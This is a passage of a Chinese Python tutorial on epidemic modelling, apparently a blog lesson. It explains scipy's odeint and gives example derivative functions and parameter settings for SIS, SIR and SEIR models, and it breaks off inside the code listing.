class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span></span></span><span class=\"\" style=\"top: -2.97em;\"><span class=\"pstrut\" style=\"height: 3.008em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"mopen\">(</span><span class=\"mord\">0</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span></span></span><span class=\"\" style=\"top: -1.53em;\"><span class=\"pstrut\" style=\"height: 3.008em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">i</span><span class=\"mopen\">(</span><span class=\"mord\">0</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 1.91em;\"><span class=\"\"></span></span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span></span></span></span></span></span></p> \n <p>SEIR 模型不能求出解析解，可以通过数值计算方法求解。</p> \n <br> \n <h2><a id=\"2_SEIR__Python__82\"></a>2. SEIR 模型的 Python 编程</h2> \n <h3><a id=\"21_Scipy__84\"></a>2.1 Scipy 工具包求解微分方程组</h3> \n <p><strong>SIS 模型是常微分方程初值问题，可以使用 Scipy 工具包的 scipy.integrate.odeint() 函数求数值解。</strong></p> \n <pre><code class=\"prism language-python\">scipy<span class=\"token punctuation\">.</span>integrate<span class=\"token punctuation\">.</span>odeint<span class=\"token punctuation\">(</span>func<span class=\"token punctuation\">,</span> y0<span class=\"token punctuation\">,</span> t<span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n</code></pre> \n <p>**scipy.integrate.odeint() **是求解微分方程的具体方法，通过数值积分来求解常微分方程组。</p> \n <p><strong>odeint() 的主要参数：</strong></p> \n <ul>\n  <li><strong>func:</strong> callable(y, t, …) 　　导数函数 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> f ( y , t ) f(y,t) </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord mathdefault\" style=\"margin-right: 0.03588em;\">y</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right: 0.166667em;\"></span><span class=\"mord mathdefault\">t</span><span class=\"mclose\">)</span></span></span></span></span> ，即 y 在 t 处的导数，以函数的形式表示</li>\n  <li><strong>y0: array</strong>：　　初始条件 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> y 0 y_0 </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.625em; vertical-align: -0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right: 0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: -0.03588em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span></span></span></span></span>，注意 SEIR模型是二元常微分方程组， 初始条件为数组向量 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> y 0 = [ i 0 , s 0 ] y_0=[i_0, s_0] </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.625em; vertical-align: -0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right: 0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: -0.03588em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mopen\">[</span><span class=\"mord\"><span class=\"mord mathdefault\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right: 0.166667em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">s</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mclose\">]</span></span></span></span></span></li>\n  <li><strong>t: array</strong>：　　求解函数值对应的时间点的序列。序列的第一个元素是与初始条件 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> y 0 y_0 </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.625em; vertical-align: -0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right: 0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: -0.03588em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span></span></span></span></span> 对应的初始时间 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> t 0 t_0 </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.76508em; vertical-align: -0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">t</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span></span></span></span></span>；时间序列必须是单调递增或单调递减的，允许重复值。</li>\n  <li><strong>args</strong>: 向导数函数 func 传递参数。当导数函数 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> f ( y , t , p 1 , p 2 , . . ) f(y,t,p1,p2,..) </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord mathdefault\" style=\"margin-right: 0.03588em;\">y</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right: 0.166667em;\"></span><span class=\"mord mathdefault\">t</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right: 0.166667em;\"></span><span class=\"mord mathdefault\">p</span><span class=\"mord\">1</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right: 0.166667em;\"></span><span class=\"mord mathdefault\">p</span><span class=\"mord\">2</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right: 0.166667em;\"></span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mclose\">)</span></span></span></span></span> 包括可变参数 p1,p2… 时，通过 args =(p1,p2,…) 可以将参数p1,p2… 传递给导数函数 func。</li>\n </ul> \n <p><strong>odeint() 的返回值：</strong></p> \n <ul>\n  <li><strong>y: array</strong> 　　数组，形状为 (len(t),len(y0)，给出时间序列 t 中每个时刻的 y 值。</li>\n </ul> \n <h3><a id=\"22_odeint__SEIR__107\"></a>2.2 odeint() 求解 SEIR 模型的编程步骤</h3> \n <ol>\n  <li>导入 scipy、numpy、matplotlib 包。</li>\n  <li>定义导数函数 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> f ( y , t ) f(y,t) </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.10764em;\">f</span><span class=\"mopen\">(</span><span class=\"mord mathdefault\" style=\"margin-right: 0.03588em;\">y</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right: 0.166667em;\"></span><span class=\"mord mathdefault\">t</span><span class=\"mclose\">)</span></span></span></span></span>。注意对于常微分方程（例如 SI模型）和常微分方程组（SEIR模型），y 分别表示标量和向量，函数定义略有不同，以下给出两种情况的例程以供对比。</li>\n </ol> \n <p><strong>常微分方程的导数定义（SIS模型）</strong></p> \n <pre><code class=\"prism language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">dySIS</span><span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">,</span> t<span class=\"token punctuation\">,</span> lamda<span class=\"token punctuation\">,</span> mu<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># SIS 模型，导数函数</span>\n    dy_dt <span class=\"token operator\">=</span> lamda<span class=\"token operator\">*</span>y<span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token operator\">-</span>y<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> mu<span class=\"token operator\">*</span>y  <span class=\"token comment\"># di/dt = lamda*i*(1-i)-mu*i</span>\n    <span class=\"token keyword\">return</span> dy_dt\n</code></pre> \n <p><strong>常微分方程组的导数定义（SEIR模型）</strong></p> \n <pre><code class=\"prism language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">dySEIR</span><span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">,</span> t<span class=\"token punctuation\">,</span> lamda<span class=\"token punctuation\">,</span> delta<span class=\"token punctuation\">,</span> mu<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># SEIR 模型，导数函数</span>\n    s<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> i <span class=\"token operator\">=</span> y\n    ds_dt <span class=\"token operator\">=</span> <span class=\"token operator\">-</span> lamda<span class=\"token operator\">*</span>s<span class=\"token operator\">*</span>i  <span class=\"token comment\"># ds/dt = -lamda*s*i</span>\n    de_dt <span class=\"token operator\">=</span> lamda<span class=\"token operator\">*</span>s<span class=\"token operator\">*</span>i <span class=\"token operator\">-</span> delta<span class=\"token operator\">*</span>e  <span class=\"token comment\"># de/dt = lamda*s*i - delta*e</span>\n    di_dt <span class=\"token operator\">=</span> delta<span class=\"token operator\">*</span>e <span class=\"token operator\">-</span> mu<span class=\"token operator\">*</span>i  <span class=\"token comment\"># di/dt = delta*e - mu*i</span>\n    <span class=\"token keyword\">return</span> np<span class=\"token punctuation\">.</span>array<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>ds_dt<span class=\"token punctuation\">,</span>de_dt<span class=\"token punctuation\">,</span>di_dt<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n</code></pre> \n <p>Python 可以直接对向量、向量函数进行定义和赋值，使程序更为简洁。但考虑读者主要是 Python 小白，又涉及到看着就心烦的微分方程组，所以我们宁愿把程序写得累赘一些，便于读者将程序与前面的微分方程组逐项对应。</p> \n <ol start=\"3\">\n  <li>定义初值 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> y 0 y_0 </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.625em; vertical-align: -0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right: 0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: -0.03588em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span></span></span></span></span> 和 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> y y </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.625em; vertical-align: -0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.03588em;\">y</span></span></span></span></span> 的定义区间 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> [ t 0 , &nbsp; t ] [t_0,\\ t] </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mopen\">[</span><span class=\"mord\"><span class=\"mord mathdefault\">t</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right: 0.166667em;\"></span><span class=\"mspace\">&nbsp;</span><span class=\"mord mathdefault\">t</span><span class=\"mclose\">]</span></span></span></span></span>，注意初值为数组向量 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> y 0 = [ s 0 , e 0 , i 0 ] y_0=[s_0,e_0,i_0] </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.625em; vertical-align: -0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right: 0.03588em;\">y</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: -0.03588em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mopen\">[</span><span class=\"mord\"><span class=\"mord mathdefault\">s</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right: 0.166667em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right: 0.166667em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">i</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mclose\">]</span></span></span></span></span>。</li>\n  <li>调用 odeint() 求 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> y y </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.625em; vertical-align: -0.19444em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.03588em;\">y</span></span></span></span></span> 在定义区间 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> [ t 0 , &nbsp; t ] [t_0,\\ t] </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mopen\">[</span><span class=\"mord\"><span class=\"mord mathdefault\">t</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right: 0.166667em;\"></span><span class=\"mspace\">&nbsp;</span><span class=\"mord mathdefault\">t</span><span class=\"mclose\">]</span></span></span></span></span> 的数值解。</li>\n </ol> \n <p>SEIR 模型是三元常微分方程，返回值 y 是 len(t)*3 的二维数组。</p> \n <br> \n <h3><a id=\"23_PythonSEIR__140\"></a>2.3 Python例程：SEIR 模型</h3> \n <pre><code class=\"prism language-python\"><span class=\"token comment\"># modelCovid4_v1.py</span>\n<span class=\"token comment\"># Demo01 of mathematical modeling for Covid2019</span>\n<span class=\"token comment\"># SIR model for epidemic diseases.</span>\n<span class=\"token comment\"># Copyright 2021 Youcans, XUPT</span>\n<span class=\"token comment\"># Crated：2021-06-13</span>\n<span class=\"token comment\"># Python小白的数学建模课 @ Youcans</span>\n\n<span class=\"token comment\"># 1. SEIR 模型，常微分方程组</span>\n<span class=\"token keyword\">from</span> scipy<span class=\"token punctuation\">.</span>integrate <span class=\"token keyword\">import</span> odeint  <span class=\"token comment\"># 导入 scipy.integrate 模块</span>\n<span class=\"token keyword\">import</span> numpy <span class=\"token keyword\">as</span> np  <span class=\"token comment\"># 导入 numpy包</span>\n<span class=\"token keyword\">import</span> matplotlib<span class=\"token punctuation\">.</span>pyplot <span class=\"token keyword\">as</span> plt  <span class=\"token comment\"># 导入 matplotlib包</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dySIS</span><span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">,</span> t<span class=\"token punctuation\">,</span> lamda<span class=\"token punctuation\">,</span> mu<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># SI/SIS 模型，导数函数</span>\n    dy_dt <span class=\"token operator\">=</span> lamda<span class=\"token operator\">*</span>y<span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token operator\">-</span>y<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> mu<span class=\"token operator\">*</span>y  <span class=\"token comment\"># di/dt = lamda*i*(1-i)-mu*i</span>\n    <span class=\"token keyword\">return</span> dy_dt\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dySIR</span><span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">,</span> t<span class=\"token punctuation\">,</span> lamda<span class=\"token punctuation\">,</span> mu<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># SIR 模型，导数函数</span>\n    s<span class=\"token punctuation\">,</span> i <span class=\"token operator\">=</span> y  <span class=\"token comment\"># youcans</span>\n    ds_dt <span class=\"token operator\">=</span> <span class=\"token operator\">-</span>lamda<span class=\"token operator\">*</span>s<span class=\"token operator\">*</span>i  <span class=\"token comment\"># ds/dt = -lamda*s*i</span>\n    di_dt <span class=\"token operator\">=</span> lamda<span class=\"token operator\">*</span>s<span class=\"token operator\">*</span>i <span class=\"token operator\">-</span> mu<span class=\"token operator\">*</span>i  <span class=\"token comment\"># di/dt = lamda*s*i-mu*i</span>\n    <span class=\"token keyword\">return</span> np<span class=\"token punctuation\">.</span>array<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>ds_dt<span class=\"token punctuation\">,</span>di_dt<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dySEIR</span><span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">,</span> t<span class=\"token punctuation\">,</span> lamda<span class=\"token punctuation\">,</span> delta<span class=\"token punctuation\">,</span> mu<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># SEIR 模型，导数函数</span>\n    s<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> i <span class=\"token operator\">=</span> y  <span class=\"token comment\"># youcans</span>\n    ds_dt <span class=\"token operator\">=</span> <span class=\"token operator\">-</span>lamda<span class=\"token operator\">*</span>s<span class=\"token operator\">*</span>i  <span class=\"token comment\"># ds/dt = -lamda*s*i</span>\n    de_dt <span class=\"token operator\">=</span> lamda<span class=\"token operator\">*</span>s<span class=\"token operator\">*</span>i <span class=\"token operator\">-</span> delta<span class=\"token operator\">*</span>e  <span class=\"token comment\"># de/dt = lamda*s*i - delta*e</span>\n    di_dt <span class=\"token operator\">=</span> delta<span class=\"token operator\">*</span>e <span class=\"token operator\">-</span> mu<span class=\"token operator\">*</span>i  <span class=\"token comment\"># di/dt = delta*e - mu*i</span>\n    <span class=\"token keyword\">return</span> np<span class=\"token punctuation\">.</span>array<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>ds_dt<span class=\"token punctuation\">,</span>de_dt<span class=\"token punctuation\">,</span>di_dt<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># 设置模型参数</span>\nnumber <span class=\"token operator\">=</span> <span class=\"token number\">1e5</span>  <span class=\"token comment\"># 总人数</span>\nlamda <span class=\"token operator\">=</span> <span class=\"token number\">0.3</span>  <span class=\"token comment\"># 日接触率, 患病者每天有效接触的易感者的平均人数</span>\ndelta <span class=\"token operator\">=</span> <span class=\"token number\">0.03</span>  <span class=\"token comment\"># 日发病率，每天发病成为患病者的潜伏者占潜伏者总数的比例</span>\nmu <span class=\"token operator\">=</span> <span class=\"token number\">0.06</span>  <span class=\"token comment\"># 日治愈率, 每天治愈的患病者人数占患病者总数的比例</span>\nsigma <span class=\"token operator\">=</span> lamda <span class=\"token operator\">/</span> mu  <span class=\"token comment\"># 传染期接触数</span>\nfsig <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token operator\">/</span>sigma\ntEnd <span class=\"token operator\">=</span> <span class=\"token number\">300</span>  <span class=\"token comment\"># 预测日期长度</span>\nt <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>arange<span class=\"token punctuation\">(</span><span class=\"token number\">0.0</span><span class=\"token punctuation\">,</span>tEnd<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># (start,stop,step)</span>\ni0 <span class=\"token operator\">=</span> <span class=\"token number\">1e</span><span class=\"token operator\">-</span><span class=\"token number\">3</span>  <span class=\"token comment\"># 患病者比例的初值</span>\ne0 <span class=\"token operator\">=</span> <span class=\"token number\">1e</span><span class=\"token operator\">-</span><span class=\"token number\">3</span>  <span class=\"token comment\"># 潜伏者比例的初值</span>\ns0 <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token operator\">-</span>i0  <span class=\"token comment\"># 易感者比例的初值</span>\nY0 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>s0<span class=\"token punctuation\">,</span> e0<span class=\"token punctuation\">,</span> i0<span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 微分方程组的初值</span>\n\n<span class=\"token comment\"># odeint 数值解，求解微分方程初值问题</span>\nySI <span class=\"token operator\">=</span> odeint<span class=\"token punctuation\">(</span>dySIS<span class=\"token punctuation\">,</span> i0<span class=\"token punctuation\">,</span> t<span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>lamda<span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># SI 模型</span>\nySIS <span class=\"token operator\">=</span> odeint<span class=\"token punctuation\">(</span>dySIS<span class=\"token punctuation\">,</span> i0<span class=\"token punctuation\">,</span> t<span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>lamda<span class=\"token punctuation\">,</span>mu<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># SIS 模型</span>\nySIR <span class=\"token operator\">=</span> odeint<span class=\"token punctuation\">(</span>dySIR<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>s0<span class=\"token punctuation\">,</span>i0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> t<span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>lamda<span class=\"token punctuation\">,</span>mu<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># SIR 模型</span>\nySEIR <span class=\"token operator\">=</span> odeint<span class=\"token punctuation\">(</span>dySEIR<span class=\"token punctuation\">,</span> Y0<span class=\"token punctuation\">,</span> t<span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>lamda<span class=\"token punctuation\">,</span>delta<span class=\"token 